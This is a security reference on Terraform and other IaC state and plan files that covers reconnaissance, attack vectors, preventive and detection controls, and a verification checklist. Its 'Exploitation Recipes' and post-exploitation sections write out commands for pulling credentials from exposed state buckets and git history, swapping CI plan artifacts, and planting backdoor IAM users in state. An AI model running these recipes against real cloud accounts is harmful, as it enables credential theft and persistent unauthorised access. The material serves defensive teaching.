# State Files and Plan Artifacts

Reference for the two artifacts that carry trust in an IaC pipeline: the state file and the plan file. Both contain secrets, both are trusted by the apply step, and both are frequently the weakest point of an otherwise hardened pipeline.

## 1. Overview

IaC tools separate "what is described" (the configuration) from "what exists" (the state) and "what will change" (the plan). The two operational artifacts are:

- **State file.** The authoritative record of every resource the tool manages. Contains every attribute, including passwords, keys, tokens, connection strings. Stored in a backend (S3, GCS, Azure Blob, Terraform Cloud, local).
- **Plan file.** The diff between the state and the desired configuration. Produced by `terraform plan -out=plan.out` (and equivalents in other tools). Applied by `terraform apply plan.out` without re-evaluating the configuration.

Threat model per tool:

| Tool | State file | Plan file | Trust boundary |
|------|-----------|-----------|----------------|
| Terraform / OpenTofu | `terraform.tfstate` + `.terraform.tfstate.lock.info` | `plan.out` (opaque format) | Backend credentials, plan transfer |
| CloudFormation | `DescribeStacks` API, `--template-url` | Change set (`create-change-set`) | CloudFormation role, template URL |
| Pulumi | `pulumi.*.json` in state backend | `pulumi preview --json` (advisory) | State backend, Pulumi Cloud |
| Helm | Release secret in cluster | `helm template` output (advisory) | Cluster RBAC, chart source |

Both artifacts carry secrets. Both are trusted. Both are frequently the first thing an attacker looks for.

## 2. Reconnaissance / Enumeration

### Offensive

- **Backend naming conventions.** `aws s3 ls | grep -Ei 'tf|terraform|state|iac'` reveals candidate buckets. Common names: `<org>-tfstate`, `<org>-terraform-state`, `<env>-tf-state`.
- **Git history.** `git log --all --full-history -- '*.tfstate' '*.tfstate.backup' 'terraform.tfstate*'` reveals historical state files that were removed from the working tree but remain in history.
- **CI artifacts.** GitHub Actions artifacts, GitLab artifacts, Azure DevOps artifacts sometimes retain `plan.out` for months. Downloadable by anyone with read access to the pipeline.
- **Public Terraform Cloud / Spacelift / Env0.** If the workspace is public (rare but happens), the API exposes state and variables.
- **Provider API.** `aws s3api get-bucket-policy --bucket <candidate>` confirms whether the state bucket is publicly readable or readable by a low-privilege principal.
- **`.terraform/` directory on developer laptops.** Contains the local backend state, sometimes with cached provider credentials. Often committed to git by accident.

### Defensive

- Inventory every state backend and every plan artifact across all pipelines.
- Confirm backend access is restricted to the CI identity + security team only.
- Confirm no historical state files exist in any git repository (`git log --all --full-history`).
- Confirm plan artifacts are ephemeral (deleted after apply) or signed.

## 3. Common Attack Vectors

- **Public state bucket.** S3 / GCS / Azure Blob bucket readable by `AuthenticatedUsers` or with a permissive bucket policy. Any cloud credential in the account reads the state.
- **Over-privileged state bucket access.** Bucket readable by the whole account, not just the CI identity. Developers, contractors, auditors all have access.
- **State bucket not encrypted.** Plaintext state at rest in the bucket. S3 default encryption is not always enabled on old buckets.
- **State bucket without versioning.** Accidentally corrupted state cannot be restored; a state poison attack cannot be detected by diff.
- **Plan artifact transfer over an untrusted channel.** CI separates plan and apply into different jobs. The plan is stored as an artifact (S3, GitHub Actions artifact, shared filesystem). Anyone who can write to that artifact store can swap the plan.
- **Plan artifact in a shared filesystem.** Self-hosted runners share `/tmp` between jobs. A concurrent job can swap `plan.out` after it is produced.
- **Plan artifact not cleaned up.** Old plans remain in the artifact store. An attacker who gains access reads the plan and learns every resource attribute, including secrets.
- **`terraform.tfstate.backup` committed to git.** Simple mistake, full credential disclosure.
- **State file in a developer's local `.terraform/`.** Local backend used in production by accident. Developer laptop compromise = production state compromise.
- **Lock file poisoning.** `.terraform.tfstate.lock.info` forged to block legitimate plans or to inject a resource before the next plan.

## 4. Exploitation Recipes

### 4.1 Read state from a misconfigured S3 bucket

```bash
# Any low-privilege cloud credential can read the bucket if the policy allows it:
$ aws s3 ls s3://acme-terraform-state/
PRE prod/
PRE staging/

$ aws s3 cp s3://acme-terraform-state/prod/terraform.tfstate ./prod.tfstate
$ jq '.resources[] | select(.type | startswith("aws_iam"))' prod.tfstate
{
  "mode": "managed",
  "type": "aws_iam_access_key",
  "name": "deployer",
  "instances": [{"attributes": {"id": "AKIA...", "secret": "<SECRET_ACCESS_KEY>"}}]
}
```

Expected result: long-lived IAM access keys for the deployment user.

### 4.2 Read state from a public GCS bucket

```bash
$ gsutil ls gs://acme-terraform-state/
$ gsutil cp gs://acme-terraform-state/prod/terraform.tfstate ./prod.tfstate
$ jq '.resources[] | select(.type | startswith("google_service_account_key"))' prod.tfstate
```

### 4.3 Read state from a public Azure Blob container

```bash
$ az storage blob list --account-name acmeterraformstate --container-name prod --query "[].name"
$ az storage blob download --account-name acmeterraformstate --container-name prod --name terraform.tfstate --file ./prod.tfstate
```

### 4.4 Plan file tampering between plan and apply

```bash
# Attacker with write access to the CI artifact store:
$ terraform plan -out=attacker-plan.out
# ... craft the plan to include a new admin IAM user, then replace:
$ aws s3 cp attacker-plan.out s3://ci-artifacts/prod/plan.out

# On the next apply, the CI job runs:
# terraform apply s3://ci-artifacts/prod/plan.out
# -> Creates the attacker's admin user
```

Expected result: attacker-defined resources created in the target account.

### 4.5 State poisoning with a hidden backdoor resource

```bash
$ jq '.resources += [{
  "mode": "managed",
  "type": "aws_iam_user",
  "name": "backup",
  "provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
  "instances": [{
    "schema_version": 0,
    "attributes": {
      "name": "backup",
      "path": "/",
      "force_destroy": false
    }
  }]
}] | .serial += 1' terraform.tfstate > poison.tfstate
$ aws s3 cp poison.tfstate s3://acme-terraform-state/prod/terraform.tfstate
```

The attacker user is now recorded in state as `backup`. On the next `terraform plan`, Terraform will see a mismatch between configuration (no user) and state (user exists) and propose a destroy. Unless the attacker also adds the resource to the configuration, the backdoor is short-lived. A stealthier approach is to modify an existing resource in-place (add an inline policy, add a key).

### 4.6 State file from git history

```bash
$ git log --all --full-history --oneline -- '*.tfstate'
$ git show <sha>:terraform.tfstate | jq '.resources[] | select(.type == "aws_db_instance") | .instances[].attributes.password'
```

Expected result: plaintext database password from a historical state file. Deleting the file from the working tree does not remove it from history.

## 5. Post-Exploitation

- **Use the state credentials.** Access keys, database passwords, and connection strings from the state give direct access to the managed infrastructure.
- **Persist via state.** Add a resource to state and to configuration. The next plan sees consistency, the attacker resource survives.
- **Persist via backend credentials.** A state bucket write primitive also grants read; store a copy of the state in an attacker-controlled bucket for future exfiltration.
- **Plan file exfiltration.** A stolen plan file is a full inventory of the intended infrastructure change, including secrets embedded in user_data, environment variables, and connection strings.
- **Lateral movement.** The state usually contains references to other state files (via `terraform_remote_state` data sources). Read the referenced states for broader credential access.
- **Covering tracks.** `terraform plan` in read-only mode is not audited by default at the API level. Reading state from S3 (GetObject) is audited only if S3 server access logs are enabled.

## 6. Preventive Controls

### State backend

- **Remote state for every environment.** No local backend on developer laptops or CI runners.
- **Encryption at rest.** S3 SSE-KMS with a customer-managed key; GCS CMEK; Azure Blob customer-managed key.
- **Encryption in transit.** TLS to the backend. No `s3://` endpoints with HTTP allowed.
- **Versioning.** S3 versioning, GCS object versioning, Azure Blob versioning. Protects against accidental or malicious overwrite.
- **Access control.** Only the CI identity and the security team. No group-wide read. Bucket policy scoped to specific IAM roles.
- **Block public access.** S3 Block Public Access, GCS public access prevention, Azure Blob public access disabled at the account level.
- **Access logging.** S3 server access logs to a separate bucket; GCS access logs; Azure Blob diagnostic logs.
- **MFA delete.** S3 MFA delete on the state bucket.
- **Separate state per environment.** `prod`, `staging`, `dev` in separate buckets with separate credentials.
- **Separate state per service.** Split the monolith. Smaller blast radius if one state is leaked.
- **State file encryption is not enough.** Sensitive attributes in state are encrypted at rest but are decrypted when read by the CI. Access control is the primary defense.

### Plan artifact

- **Same job for plan and apply.** The strongest defense. No plan artifact is transferred.
- **If separate jobs are required:** sign the plan artifact with a key only the apply job can verify (cosign, sigstore, GPG).
- **Ephemeral plan artifacts.** Delete after apply. No retention.
- **No shared filesystem.** Ephemeral runners for each job; no `/tmp` shared between jobs.

### Secrets

- **Never in IaC files.** Use `data` blocks to read from a secret manager at plan time.
- **`sensitive = true` on every variable and output that can hold a secret.** Does not remove the secret from state, but hides it from CLI output.
- **Rotate state credentials.** Long-lived state keys are the top exfiltration target.

## 7. Detection Controls

### Backend access

- **S3 server access logs.** Alert on `GetObject` on the state bucket from any principal outside the CI identity.
- **CloudTrail data events.** Enable S3 data events on the state bucket. Every `GetObject` is logged.
- **GCS data access logs.** Enable at the bucket level.
- **Azure Blob diagnostic settings.** Enable `StorageRead`, `StorageWrite`, `StorageDelete`.
- **Principal allowlist.** Alert on any principal outside the CI role reading the state.

### State integrity

- **Versioning diff.** Compare current state version to the previous version on every CI run. Unexpected change outside the pipeline is suspicious.
- **Backend lock monitoring.** Unexpected lock release events indicate tampering.
- **Object hash.** Store a hash of the state file after each apply. On the next run, verify the hash matches before reading.

### Plan artifact integrity

- **Hash verification.** Apply only if the plan hash matches the hash produced at plan time.
- **Signature verification.** Apply only if the plan is signed by the CI signing key.
- **Artifact provenance.** Use SLSA or in-toto attestation on the plan artifact.

### Secret exposure

- **Secret scanning on the state bucket.** Scan every version of every object for patterns matching cloud credentials, database passwords, tokens.
- **Secret scanning on git history.** Gitleaks, trufflehog with full history mode on IaC repos.

## 8. Verification

- [ ] Every state backend is remote, encrypted, versioned, and access-logged.
- [ ] No principal outside the CI identity + security team can read production state.
- [ ] Block Public Access enabled on the state bucket.
- [ ] MFA delete enabled on the state bucket.
- [ ] Separate state per environment and per service.
- [ ] No `.tfstate` files in any git repository (working tree or history).
- [ ] Plan and apply run in the same job, OR the plan artifact is signed and hash-verified.
- [ ] No plan artifacts retained beyond the apply step.
- [ ] State integrity hash stored and verified before each apply.
- [ ] Secret scanning covers the state bucket and the git history.

## 9. Certification Alignment

- **HashiCorp Certified: Terraform Associate:** remote backends, state locking, workspaces, sensitive data.
- **AWS Certified DevOps Engineer - Professional:** Domain 2 (Configuration Management and IaC), Domain 4 (Monitoring and Logging).
- **AWS Certified Security - Specialty:** Domain 3 (Infrastructure Security), Domain 4 (Identity and Access Management).
- **Google Cloud Professional Cloud DevOps Engineer:** IaC and CI/CD security.
- **Azure DevOps Engineer Expert (AZ-400):** pipeline security, IaC.
- **CompTIA Security+:** Domains 2-4.

## 10. Production Notes

- **State size.** Very large state files (hundreds of MB) indicate a monolith. Split them.
- **State locking.** Every backend must support locking. S3 with DynamoDB table, GCS with native locking, Azure Blob with native locking. Local backend has no locking.
- **`terraform state` commands are dangerous.** `state rm`, `state mv`, `state push` modify the state directly, bypassing configuration. Any use in production should require approval.
- **`terraform apply -refresh-only`.** Refreshes the state without changing infrastructure. Useful for drift detection but also for reading the current state.
- **Backup state before risky operations.** `terraform state pull > backup.tfstate` before any manual state operation.

## 11. References

- Terraform sensitive data in state - https://developer.hashicorp.com/terraform/language/state/sensitive-data
- Terraform remote state backends - https://developer.hashicorp.com/terraform/language/settings/backends/configuration
- Terraform state locking - https://developer.hashicorp.com/terraform/language/state/locking
- Terraform state inspection - https://developer.hashicorp.com/terraform/cli/commands/state
- AWS S3 Block Public Access - https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html
- AWS S3 MFA delete - https://docs.aws.amazon.com/AmazonS3/latest/userguide/MultiFactorAuthenticationDelete.html
- Google Cloud Object Versioning - https://cloud.google.com/storage/docs/object-versioning
- Azure Blob versioning - https://learn.microsoft.com/en-us/azure/storage/blobs/versioning-overview
- Sigstore / Cosign - https://docs.sigstore.dev/
- SLSA provenance - https://slsa.dev/
- NIST SP 800-204D - https://csrc.nist.gov/publications/detail/sp/800-204d/final